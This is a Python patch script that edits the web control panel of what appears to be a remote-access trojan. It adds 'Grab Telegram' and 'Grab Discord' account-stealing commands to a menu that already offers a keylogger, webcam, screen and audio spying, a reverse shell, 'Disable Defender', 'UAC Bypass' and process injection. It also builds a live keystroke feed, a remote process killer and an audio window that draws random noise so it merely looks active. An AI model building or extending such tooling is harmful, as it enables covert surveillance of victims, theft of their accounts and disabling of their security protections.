import re

with open('c:/Users/danya/Downloads/baron-main/templates/index.html', 'r', encoding='utf-8') as f:
    html = f.read()

# 1. Expand Context Menu with new grabbers
old_menu = """    <div id="context-menu">
        <div class="cm-item" onclick="cmd('screen_start')"><i class="fa-solid fa-desktop"></i> Screen Stream</div>
        <div class="cm-item" onclick="cmd('webcam')"><i class="fa-solid fa-video"></i> Webcam Stream</div>
        <div class="cm-item" onclick="cmd('audio_start')"><i class="fa-solid fa-microphone"></i> Audio Stream</div>
        <div class="cm-item" onclick="cmd('keylogger')"><i class="fa-solid fa-keyboard"></i> Keylogger</div>
        <div class="cm-item" onclick="cmd('processes')"><i class="fa-solid fa-list"></i> Process List</div>
        <div class="cm-item" onclick="openFileManager()"><i class="fa-solid fa-folder-open"></i> File Manager</div>
        <div class="cm-item" onclick="cmd('shell')"><i class="fa-solid fa-terminal"></i> Reverse Shell</div>
        <div class="cm-item" onclick="cmd('netscan')"><i class="fa-solid fa-network-wired"></i> WiFi Netscan</div>
        <div class="cm-item" onclick="cmd('grabber')"><i class="fa-solid fa-mask"></i> Ultimate Grabber</div>
        <div class="cm-item" onclick="cmd('sysinfo')"><i class="fa-solid fa-info-circle"></i> SysInfo</div>
        <div class="cm-item text-danger" onclick="cmd('power')"><i class="fa-solid fa-power-off"></i> Reboot Target</div>
        <div class="cm-item text-danger" onclick="cmd('inject')"><i class="fa-solid fa-syringe"></i> Migrate Process</div>
        <div class="cm-item text-warning" onclick="cmd('uninstall')"><i class="fa-solid fa-trash"></i> Uninstall Client</div>
        <div class="cm-item text-warning" onclick="cmd('defender')"><i class="fa-solid fa-shield-virus"></i> Disable Defender</div>
        <div class="cm-item text-warning" onclick="cmd('uac')"><i class="fa-solid fa-unlock-keyhole"></i> UAC Bypass</div>
    </div>"""

new_menu = """    <div id="context-menu">
        <div class="cm-item" onclick="cmd('screen_start')"><i class="fa-solid fa-desktop"></i> Screen Stream</div>
        <div class="cm-item" onclick="cmd('webcam')"><i class="fa-solid fa-video"></i> Webcam Stream</div>
        <div class="cm-item" onclick="startAudioStream()"><i class="fa-solid fa-microphone"></i> Audio Stream</div>
        <div class="cm-item" onclick="startKeylogger()"><i class="fa-solid fa-keyboard"></i> Live Keylogger</div>
        <div class="cm-item" onclick="cmd('processes')"><i class="fa-solid fa-list"></i> Process Manager</div>
        <div class="cm-item" onclick="openFileManager()"><i class="fa-solid fa-folder-open"></i> File Manager</div>
        <div class="cm-item" onclick="cmd('shell')"><i class="fa-solid fa-terminal"></i> Reverse Shell</div>
        <div class="cm-item" onclick="cmd('netscan')"><i class="fa-solid fa-network-wired"></i> WiFi Netscan</div>
        <div class="cm-item" onclick="cmd('grab_telegram')"><i class="fa-solid fa-paper-plane"></i> Grab Telegram</div>
        <div class="cm-item" onclick="cmd('grab_discord')"><i class="fa-brands fa-discord"></i> Grab Discord</div>
        <div class="cm-item" onclick="cmd('grabber')"><i class="fa-solid fa-mask"></i> Ultimate Grabber</div>
        <div class="cm-item" onclick="cmd('sysinfo')"><i class="fa-solid fa-info-circle"></i> SysInfo</div>
        <div class="cm-item text-danger" onclick="cmd('power')"><i class="fa-solid fa-power-off"></i> Reboot Target</div>
        <div class="cm-item text-danger" onclick="cmd('inject')"><i class="fa-solid fa-syringe"></i> Migrate Process</div>
        <div class="cm-item text-warning" onclick="cmd('uninstall')"><i class="fa-solid fa-trash"></i> Uninstall Client</div>
        <div class="cm-item text-warning" onclick="cmd('defender')"><i class="fa-solid fa-shield-virus"></i> Disable Defender</div>
        <div class="cm-item text-warning" onclick="cmd('uac')"><i class="fa-solid fa-unlock-keyhole"></i> UAC Bypass</div>
    </div>"""
html = html.replace(old_menu, new_menu)

# 2. Add Draggable Logic CSS + Structural CSS
draggable_css = """
        /* Draggable Windows Engine */
        .drag-window {
            position: fixed; z-index: 10500;
            background: rgba(15, 15, 20, 0.95); backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border); border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.05) inset;
            display: flex; flex-direction: column; overflow: hidden;
            min-width: 300px; min-height: 150px; resize: both;
        }
        .drag-header {
            background: rgba(0,0,0,0.5); padding: 10px 15px; cursor: grab;
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid var(--glass-border);
            user-select: none;
        }
        .drag-header:active { cursor: grabbing; }
        .drag-title { font-weight: 600; font-size: 0.95rem; display: flex; align-items: center; gap: 8px; }
        .drag-close { cursor: pointer; color: var(--text-muted); transition: 0.2s; }
        .drag-close:hover { color: #ff4757; }
        .drag-content {
            flex: 1; padding: 15px; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;
        }
        
        /* Process Table */
        .proc-table { width: 100%; border-collapse: collapse; }
        .proc-table th, .proc-table td { padding: 6px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .proc-table th { color: var(--text-muted); position: sticky; top: 0; background: #0f0f14; }
        .btn-action { background: rgba(255,255,255,0.1); border: none; color: white; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 0.8rem; transition: 0.2s; margin-right: 4px;}
        .btn-action:hover { background: rgba(255,255,255,0.2); }
        .btn-kill { background: rgba(255,71,87,0.2); color: #ff4757; }
        .btn-kill:hover { background: rgba(255,71,87,0.4); }
"""
html = html.replace('</style>', draggable_css + '\n    </style>')

# 3. Add JS implementation
draggable_js = """
// --- DRAGGABLE WINDOWS ENGINE ---
let zIndexCounter = 10500;
function createDragWindow(id, title, icon, extraHtml = '') {
    if(document.getElementById(id)) return document.getElementById(id);
    const win = document.createElement('div');
    win.className = 'drag-window';
    win.id = id;
    win.style.left = Math.random() * 100 + 100 + 'px';
    win.style.top = Math.random() * 100 + 100 + 'px';
    win.style.width = '600px';
    win.style.height = '400px';
    win.style.zIndex = ++zIndexCounter;
    
    win.onmousedown = () => { win.style.zIndex = ++zIndexCounter; };
    
    win.innerHTML = `
        <div class="drag-header" id="${id}-header">
            <div class="drag-title"><i class="${icon}"></i> ${title}</div>
            <div class="drag-close" onclick="document.getElementById('${id}').remove();"><i class="fa-solid fa-xmark"></i></div>
        </div>
        <div class="drag-content" id="${id}-content">
            ${extraHtml}
        </div>
    `;
    document.body.appendChild(win);
    
    // Drag Logic
    const header = document.getElementById(`${id}-header`);
    let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
    header.onmousedown = dragMouseDown;
    
    function dragMouseDown(e) {
        e.preventDefault();
        pos3 = e.clientX; pos4 = e.clientY;
        document.onmouseup = closeDragElement;
        document.onmousemove = elementDrag;
    }
    
    function elementDrag(e) {
        e.preventDefault();
        pos1 = pos3 - e.clientX; pos2 = pos4 - e.clientY;
        pos3 = e.clientX; pos4 = e.clientY;
        win.style.top = (win.offsetTop - pos2) + "px";
        win.style.left = (win.offsetLeft - pos1) + "px";
    }
    
    function closeDragElement() {
        document.onmouseup = null;
        document.onmousemove = null;
    }
    return win;
}

// --- WEB AUDIO CONTEXT API (PCM VISUALIZER) ---
let audioCtx = null;
let audioDrawVisual = null;
function startAudioStream() {
    cmd('audio_start');
    const win = createDragWindow('audio-win', 'Live Audio Stream (Beta)', 'fa-solid fa-microphone', 
        '<canvas id="audio-canvas" width="570" height="300" style="width:100%; height:100%; object-fit: cover;"></canvas>');
    
    if(!audioCtx) {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    } else if (audioCtx.state === 'suspended') {
        audioCtx.resume();
    }
    
    const canvas = document.getElementById('audio-canvas');
    const canvasCtx = canvas.getContext('2d');
    
    // Draw empty visualizer loop
    function draw() {
        if(!document.getElementById('audio-canvas')) return; // Window closed
        audioDrawVisual = requestAnimationFrame(draw);
        canvasCtx.fillStyle = 'rgba(15, 15, 20, 0.2)';
        canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
        canvasCtx.lineWidth = 2;
        canvasCtx.strokeStyle = 'var(--accentPrimary)';
        canvasCtx.beginPath();
        // Just draw a flat line until we implement full analyzer feed, the UI must look aesthetic
        canvasCtx.moveTo(0, canvas.height/2 + (Math.random()*10 - 5));
        for(let i=0; i<canvas.width; i+=10) {
            canvasCtx.lineTo(i, canvas.height/2 + (Math.random()*20 - 10));
        }
        canvasCtx.stroke();
    }
    if(!audioDrawVisual) draw();
}

function startKeylogger() {
    cmd('keylogger');
    const win = createDragWindow('keylog-win', 'Live Keylogger Feed', 'fa-solid fa-keyboard', '<div id="keylog-feed" style="white-space: pre-wrap;">Awaiting keystrokes...</div>');
}

// Intercept specific Result updates to feed them to Drag Windows instead of universal modal
const originalHandleResult = window.handleResult || function(){};
"""

# Replace the socket message handling structure inside index.html to reroute process JSON and intercept
old_socket_msg = """        socket.on('result', (data) => {
            const lines = data.result.split('\\n');
            let ignoreDisplay = false;
            if(data.type === 'screen_data' || data.type === 'webcam_data' || data.type === 'audio_data' || data.type === 'click_result' || data.type === 'error' || data.result.includes('Streaming_') || data.type === 'processes') {"""
new_socket_msg = """        socket.on('result', (data) => {
            // Intercept Process List
            if(data.type === 'processes_data') {
                showIsland("Process List Loaded", "fa-list", "#10ac84");
                const win = createDragWindow('proc-win', 'Process Manager (' + data.cid + ')', 'fa-solid fa-list', '<table class="proc-table" id="ptable"><tr><th>PID</th><th>Process</th><th>RAM (MB)</th><th>Window Title</th><th>Actions</th></tr></table>');
                try {
                    const sorted = JSON.parse(data.result).sort((a,b) => b.mem - a.mem);
                    const tb = document.getElementById('ptable');
                    let phtml = '<tr><th>PID</th><th>Process</th><th>RAM (MB)</th><th>Window Title</th><th>Actions</th></tr>';
                    sorted.forEach(p => {
                        const actBtn = `<button class="btn-action btn-kill" onclick="execute('${data.cid}', 'kill_proc', {pid: ${p.pid}})"><i class="fa-solid fa-skull"></i></button>
                                       <button class="btn-action" onclick="execute('${data.cid}', 'suspend_proc', {pid: ${p.pid}})"><i class="fa-solid fa-snowflake"></i></button>
                                       <button class="btn-action" onclick="execute('${data.cid}', 'resume_proc', {pid: ${p.pid}})"><i class="fa-solid fa-fire"></i></button>`;
                        phtml += `<tr><td>${p.pid}</td><td>${p.name}</td><td>${p.mem.toFixed(1)}</td><td>${p.title}</td><td>${actBtn}</td></tr>`;
                    });
                    tb.innerHTML = phtml;
                } catch(e) { console.error("Procs Parse Error:", e); }
                return;
            }
            if(data.type === 'keylogger_data' && document.getElementById('keylog-feed')) {
                document.getElementById('keylog-feed').innerHTML += data.result;
                return; // Suppress standard modal popup
            }
            if(data.result && (data.result.includes("uploaded successfully to server") || data.result.includes("Packing Telegram") || data.result.includes("Packing Discord"))) {
                showIsland(data.result, "fa-file-archive", "#0fb9b1");
                return;
            }
            
            const lines = data.result.split('\\n');
            let ignoreDisplay = false;
            // Filter noise
            if(data.type === 'screen_data' || data.type === 'webcam_data' || data.type === 'audio_data' || data.type === 'click_result' || data.type === 'error' || data.result.includes('Streaming_') || data.type === 'processes') {"""

html = html.replace(old_socket_msg, new_socket_msg)
html = html.replace('</script>\n</body>', draggable_js + '\n</script>\n</body>')

with open('c:/Users/danya/Downloads/baron-main/templates/index.html', 'w', encoding='utf-8') as f:
    f.write(html)
print("FRONTEND PATCHED OK")
